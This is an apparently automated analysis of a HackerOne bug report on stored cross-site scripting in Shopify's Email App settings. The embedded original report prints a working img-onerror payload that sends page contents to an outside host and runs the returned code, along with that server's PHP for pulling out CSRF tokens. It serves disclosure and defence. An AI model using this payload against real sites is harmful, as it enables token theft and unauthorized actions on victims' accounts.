# XSS within Shopify Email App - Admin Settings

## Metadata
- **Source:** HackerOne
- **Report:** 869831 | https://hackerone.com/reports/869831
- **Submitted:** 2020-05-10
- **Reporter:** imgnotfound
- **Program:** Shopify
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS), Improper Input Validation, HTML Injection
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in Shopify's Email App where users with Settings access can inject malicious HTML/JavaScript into the optional 'Apartment, suite, etc.' field of the store address. The injected payload executes when the address field is rendered in the Shopify Email Template editor, allowing attackers to exfiltrate CSRF tokens and trigger unauthorized GraphQL requests.

## Attack scenario
1. Attacker identifies that the 'Apartment, suite, etc.' field in Store Settings accepts HTML input despite having a 255 character display limit
2. Attacker bypasses character limits using HTML/JavaScript encoding and crafts XSS payload with img onerror event handler
3. Attacker injects malicious code that exfiltrates the CSRF token from the page's meta tags via postMessage to attacker-controlled domain
4. When a user with Settings access installs the Shopify Email App, the payload executes in the Email Template editor context
5. Attacker's JavaScript extracts the CSRF token and sends it to attacker's server (fbs.ninja) for credential harvesting
6. Attacker uses the CSRF token to perform unauthorized actions against the email.shopifyapps.com/graphql endpoint on behalf of the victim

## Root cause
Insufficient input validation and sanitization of the store address field. The application failed to: (1) properly validate HTML content in user-supplied fields, (2) implement Content Security Policy headers, and (3) sanitize output when rendering the address in the Email Template editor. The character limit validation was also bypassable through encoding.

## Attacker mindset
Opportunistic insider or merchant-level attacker seeking to compromise admin accounts or perform unauthorized actions. The attacker demonstrates moderate sophistication by using postMessage API for cross-origin communication, implementing timing delays to allow page load completion, and leveraging DOM XPath queries to extract CSRF tokens. The goal appears to be lateral movement or privilege escalation within the Shopify ecosystem.

## Defensive takeaways
- Implement strict input validation with whitelist approach - reject any HTML/JavaScript special characters in address fields
- Apply output encoding/escaping when rendering user-supplied data in templates (use framework-native escaping functions)
- Deploy Content Security Policy (CSP) headers to prevent inline script execution and restrict resource loading origins
- Implement server-side HTML sanitization library (e.g., DOMPurify, HTMLPurifier) to strip dangerous tags and attributes
- Use Security Headers like X-XSS-Protection and X-Content-Type-Options to provide defense-in-depth
- Validate input length server-side, not just client-side, to prevent bypass attempts
- Implement CSRF token rotation and stricter SameSite cookie policies
- Apply principle of least privilege - restrict which fields admin users can edit based on role
- Add security headers to iframe contexts used by Email Template editor
- Conduct security review of all user-input fields in admin settings for similar vulnerabilities

## Variant hunting
Search for similar vulnerabilities in other Shopify admin settings fields (billing address, contact information, business details). Examine other Shopify Apps that render admin settings data without sanitization. Check if file upload fields accept HTML/SVG with embedded scripts. Test other optional/comment fields across Shopify admin for XSS. Investigate whether the Email App template rendering context inherits the same XSS vulnerability in other template variable substitutions.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing - Spearphishing Link (to credential harvesting server)
- T1539 - Steal Web Session Cookie (CSRF token exfiltration)
- T1566 - Phishing - Email (potential vector for initial compromise)
- T1185 - Man in the Browser (XSS execution context)

## Notes
The vulnerability demonstrates a critical gap in the data flow between Store Settings input and Email App template rendering. The attacker's use of postMessage and timing delays suggests deliberate exploitation technique refinement. The CSRF token extraction payload is particularly concerning as it enables account takeover or unauthorized API calls. The writeup lacks disclosure of actual bounty amount and timeline, but the severity warrants high priority patching. The vulnerability likely affects multiple Shopify admin features that consume settings data without proper sanitization.

## Full report
<details><summary>Expand</summary>

The Shopify Email Application is vulnerable to XSS

A user with only **Settings** https://hackerone.myshopify.com/admin/settings/general access can inject html within the **Apartment, suite, etc. (optional)** of the **Store address** section that will then be displayed in the Shopify Email Template edition

## Steps to reproduce
1. Open **Settings** page
1. Insert malicious HTML within the **Apartment, suite, etc. (optional)** field. Please note that the inserted code is a bit too complex for nothing but was just trying out if it was possible to "bypass" the 255 characters limit , which is possible. (Code snippet can be found below).
██████
3. Install Shopify Email App
4. Select a template that displays **Apartment, suite, etc. (optional)** field
{F822194}


## Javascript code used
```
<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/>
```

## PHP code of https://fbs.ninja used in the XMLHttpRequest
```
<?
header("Access-Control-Allow-Origin: *");

$html = file_get_contents('php://input');

$doc = DOMDocument::loadHTML($html);
$xpath = new DOMXPath($doc);
$query = "//meta[@name='csrf-token']";
$entries = $xpath->query($query);

$csrf = "";
foreach ($entries as $entry) {
	$csrf = $entry->getAttribute('content');
	break;
}

$request = "alert('CSRF Token: " . $csrf . "');";

echo $request;

?>

## Impact

An attacker could at least trigger requests to the https://email.shopifyapps.com/graphql endpoint.

</details>

---
*Analysed by Claude on 2026-05-12*
